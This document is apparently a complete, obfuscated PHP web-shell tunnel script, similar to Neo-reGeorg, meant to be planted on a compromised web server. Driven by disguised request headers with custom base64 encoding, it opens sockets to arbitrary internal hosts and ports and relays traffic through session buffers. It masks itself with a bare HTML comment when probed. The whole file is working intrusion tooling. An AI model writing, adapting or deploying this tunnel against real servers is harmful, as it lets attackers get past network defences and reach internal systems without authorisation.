<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[ucwords(strtolower($arh_key))] = $val;
            }
        }
        return($arh);
    }
}

set_time_limit(0);
$headers=apache_request_headers();
$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "CE0XgUOIQFsw1tcy+H95alrukYfdznxZR8PJo2qbh4pe6/VDKijTL3v7BAmGMSNW";

$cmd = $headers["Ffydhndmhhl"];
$mark = substr($cmd,0,22);
$cmd = substr($cmd, 22);
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;

switch($cmd){
    case "b5v9XJbF":
        {
            $target_ary = explode("|", base64_decode(strtr($headers["Nnpo"], $de, $en)));
            $target = $target_ary[0];
            $port = (int)$target_ary[1];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                header('Sbxspawzq: G87IdjaYlmwUWO9QjVFHPeP2SVfeMhzT6_pvfN46Km7PazEmu225XmpiAa');
                header('Die: k4MBX7QElVQzrmOdkml_G3pnYz55EFZPIwTO');
                return;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "0FX":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "TQDLLDvYzyrB4pPbieRBk90FIdYgjJcE2si70wIXfql":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header('Sbxspawzq: CapFLueBCn2ZM');
                header("Connection: Keep-Alive");
                echo strtr(base64_encode($readBuffer), $en, $de);
            } else {
                header('Sbxspawzq: G87IdjaYlmwUWO9QjVFHPeP2SVfeMhzT6_pvfN46Km7PazEmu225XmpiAa');
            }
        }
        break;
    case "CtWP7tBSKiDnysT9hP9pa": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                header('Sbxspawzq: G87IdjaYlmwUWO9QjVFHPeP2SVfeMhzT6_pvfN46Km7PazEmu225XmpiAa');
                header('Die: 9NMcA1i8lzO779wa6O');
                return;
            }
            header('Content-Type: application/octet-stream');
            $rawPostData = file_get_contents("php://input");
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
                session_write_close();
                header('Sbxspawzq: CapFLueBCn2ZM');
                header("Connection: Keep-Alive");
            } else {
                header('Sbxspawzq: G87IdjaYlmwUWO9QjVFHPeP2SVfeMhzT6_pvfN46Km7PazEmu225XmpiAa');
                header('Die: QmPrA86mT15');
            }
        }
        break;
    default: {
        @session_start();
        session_write_close();
        exit("<!-- HdgznEy73Ghv4jiuh5s83czHnFBYBpOdRVE4qyMTNktshD7xIS9S09PrPNH -->");
    }
}
?>
